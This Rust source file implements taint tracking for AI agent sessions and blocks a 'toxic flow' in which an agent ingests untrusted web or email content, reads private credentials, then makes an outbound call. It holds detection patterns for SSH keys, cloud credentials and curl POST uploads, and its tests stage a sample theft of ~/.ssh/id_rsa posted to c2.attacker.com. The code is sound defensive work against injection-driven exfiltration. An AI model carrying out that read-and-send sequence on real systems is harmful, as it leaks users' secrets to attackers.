//! Session Taint Model & Toxic-Flow Controls (PRD F3-S1)
//!
//! Tracks provenance labels across multi-turn agent sessions:
//! - `UntrustedInput`: External, unverified data (web fetches, browser sessions, emails, issue bodies)
//! - `PrivateDataRead`: Access to private developer keys, tokens, or credential stores
//! - `ExfilCapable`: Outbound channels capable of transmitting data outside the host
//!
//! A "Toxic Flow" occurs when an agent ingests `UntrustedInput`, subsequently performs
//! a `PrivateDataRead`, and then attempts an `ExfilCapable` outbound call.
//! Enforces policy `toxic_flow: warn | require_approval | block`.

use serde::{Deserialize, Serialize};
use serde_json::Value;

/// Taint classification labels
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum TaintLabel {
    UntrustedInput,
    PrivateDataRead,
    ExfilCapable,
}

/// Action to take when a toxic flow sequence is identified
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ToxicFlowAction {
    Block,
    Warn,
    RequireApproval,
    Allow,
}

impl Default for ToxicFlowAction {
    fn default() -> Self {
        ToxicFlowAction::Block
    }
}

/// A recorded event contributing to session taint state
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaintEvent {
    pub tool_name: String,
    pub label: TaintLabel,
    pub reason: String,
    pub timestamp_ms: u128,
}

/// Session-scoped taint tracking state
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct SessionTaintState {
    pub has_untrusted_input: bool,
    pub has_private_data_read: bool,
    pub events: Vec<TaintEvent>,
}

impl SessionTaintState {
    pub fn new() -> Self {
        Self::default()
    }

    /// Reset or clear taint state
    pub fn reset(&mut self) {
        self.has_untrusted_input = false;
        self.has_private_data_read = false;
        self.events.clear();
    }
}

/// Taint & Toxic-Flow Engine
#[derive(Debug, Clone)]
pub struct TaintEngine {
    pub default_action: ToxicFlowAction,
}

impl Default for TaintEngine {
    fn default() -> Self {
        Self {
            default_action: ToxicFlowAction::Block,
        }
    }
}

/// Verdict returned when evaluating a tool call against the session taint state
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ToxicFlowVerdict {
    /// Normal safe call, no toxic flow condition
    Clean,
    /// Toxic flow detected; action dictated by policy
    ToxicFlowDetected {
        action: ToxicFlowAction,
        rule_id: &'static str,
        reason: String,
    },
}

impl TaintEngine {
    pub fn new(default_action: ToxicFlowAction) -> Self {
        Self { default_action }
    }

    /// Evaluates a tool call, updates session taint labels, and checks for toxic flows.
    pub fn evaluate_and_update(
        &self,
        state: &mut SessionTaintState,
        tool_name: &str,
        params: &Value,
        policy_action: Option<ToxicFlowAction>,
    ) -> ToxicFlowVerdict {
        let action = policy_action.unwrap_or(self.default_action);
        let now_ms = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis();

        // 1. Check if tool is an UntrustedInput source
        if is_untrusted_input_source(tool_name, params) {
            state.has_untrusted_input = true;
            state.events.push(TaintEvent {
                tool_name: tool_name.to_string(),
                label: TaintLabel::UntrustedInput,
                reason: format!("Ingested untrusted external content via '{}'", tool_name),
                timestamp_ms: now_ms,
            });
        }

        // 2. Check if tool is a PrivateDataRead
        if is_private_data_read(tool_name, params) {
            state.has_private_data_read = true;
            state.events.push(TaintEvent {
                tool_name: tool_name.to_string(),
                label: TaintLabel::PrivateDataRead,
                reason: format!("Accessed sensitive credentials or private keys via '{}'", tool_name),
                timestamp_ms: now_ms,
            });
        }

        // 3. Check if tool is an ExfilCapable sink
        if is_exfil_capable_sink(tool_name, params) {
            // TOXIC FLOW CONDITION:
            // Both UntrustedInput AND PrivateDataRead have been observed in this session!
            if state.has_untrusted_input && state.has_private_data_read {
                return ToxicFlowVerdict::ToxicFlowDetected {
                    action,
                    rule_id: "TOXIC-FLOW-001",
                    reason: format!(
                        "Toxic flow detected: Exfiltration tool '{}' attempted after session ingested untrusted input and accessed private credentials (PRD F3-S1)",
                        tool_name
                    ),
                };
            }
        }

        ToxicFlowVerdict::Clean
    }
}

/// Identifies tools that bring unverified, potentially adversarial external content into the context
pub fn is_untrusted_input_source(tool_name: &str, _params: &Value) -> bool {
    let lower = tool_name.to_lowercase();
    matches!(
        lower.as_str(),
        "fetch"
            | "fetch_url"
            | "fetch_web_page"
            | "http_get"
            | "web_search"
            | "search"
            | "browser"
            | "browser_navigate"
            | "read_url_content"
            | "read_web_page"
            | "read_email"
            | "get_email"
            | "issue_read"
            | "read_issue"
            | "get_issue"
            | "rss_read"
    )
}

/// Identifies tools and parameters accessing local credentials, private keys, or secrets
pub fn is_private_data_read(tool_name: &str, params: &Value) -> bool {
    let lower = tool_name.to_lowercase();
    let is_file_tool = matches!(
        lower.as_str(),
        "read_file"
            | "read_text_file"
            | "view_file"
            | "open_file"
            | "cat"
            | "get_file"
            | "read"
    );

    if is_file_tool {
        let param_str = params.to_string().to_lowercase();
        if param_str.contains(".ssh")
            || param_str.contains("id_rsa")
            || param_str.contains("id_ed25519")
            || param_str.contains(".aws/credentials")
            || param_str.contains(".env")
            || param_str.contains("shadow")
            || param_str.contains("keychain")
            || param_str.contains("kube/config")
            || param_str.contains("credentials.db")
        {
            return true;
        }
    }

    // Direct secret retrieval tools
    matches!(
        lower.as_str(),
        "get_secret"
            | "read_secret"
            | "dump_credentials"
            | "export_keys"
    )
}

/// Identifies tools capable of exfiltrating payload data over the network or external channels
pub fn is_exfil_capable_sink(tool_name: &str, params: &Value) -> bool {
    let lower = tool_name.to_lowercase();
    if matches!(
        lower.as_str(),
        "http_post"
            | "http_put"
            | "webhook"
            | "send_email"
            | "email_send"
            | "post_message"
            | "send_webhook"
            | "upload_file"
    ) {
        return true;
    }

    // Shell tools running curl/wget with upload or POST flags
    if matches!(lower.as_str(), "exec_command" | "bash" | "sh" | "powershell" | "run_command") {
        let p_str = params.to_string().to_lowercase();
        if (p_str.contains("curl") || p_str.contains("wget"))
            && (p_str.contains("-d") || p_str.contains("-x post") || p_str.contains("-x put") || p_str.contains("--data") || p_str.contains("--post-file"))
        {
            return true;
        }
    }

    false
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn test_toxic_flow_sequence_blocked() {
        let engine = TaintEngine::new(ToxicFlowAction::Block);
        let mut state = SessionTaintState::new();

        // Step 1: Web fetch (Untrusted Input)
        let v1 = engine.evaluate_and_update(
            &mut state,
            "fetch_web_page",
            &json!({"url": "https://attacker.com/malicious-instructions.html"}),
            None,
        );
        assert_eq!(v1, ToxicFlowVerdict::Clean);
        assert!(state.has_untrusted_input);
        assert!(!state.has_private_data_read);

        // Step 2: Read sensitive private key (~/.ssh/id_rsa)
        let v2 = engine.evaluate_and_update(
            &mut state,
            "read_file",
            &json!({"path": "~/.ssh/id_rsa"}),
            None,
        );
        assert_eq!(v2, ToxicFlowVerdict::Clean);
        assert!(state.has_untrusted_input);
        assert!(state.has_private_data_read);

        // Step 3: Attempt HTTP POST exfiltration -> MUST BE BLOCKED
        let v3 = engine.evaluate_and_update(
            &mut state,
            "http_post",
            &json!({"url": "https://c2.attacker.com/loot", "body": "stolen_key"}),
            None,
        );

        match v3 {
            ToxicFlowVerdict::ToxicFlowDetected { action, rule_id, .. } => {
                assert_eq!(action, ToxicFlowAction::Block);
                assert_eq!(rule_id, "TOXIC-FLOW-001");
            }
            _ => panic!("Expected ToxicFlowDetected verdict!"),
        }
    }

    #[test]
    fn test_benign_sequence_without_untrusted_input_allowed() {
        let engine = TaintEngine::new(ToxicFlowAction::Block);
        let mut state = SessionTaintState::new();

        // PRD AC Requirement: "the same sequence without untrusted input is allowed."
        // Step 1: Read private SSH key (without prior untrusted input)
        let v1 = engine.evaluate_and_update(
            &mut state,
            "read_file",
            &json!({"path": "~/.ssh/id_rsa"}),
            None,
        );
        assert_eq!(v1, ToxicFlowVerdict::Clean);
        assert!(!state.has_untrusted_input);
        assert!(state.has_private_data_read);

        // Step 2: HTTP POST (e.g. legitimately uploading public key or authorized workflow)
        let v2 = engine.evaluate_and_update(
            &mut state,
            "http_post",
            &json!({"url": "https://internal.company.com/keys", "body": "key"}),
            None,
        );
        // Because has_untrusted_input is false, this is NOT a toxic flow!
        assert_eq!(v2, ToxicFlowVerdict::Clean);
    }
}
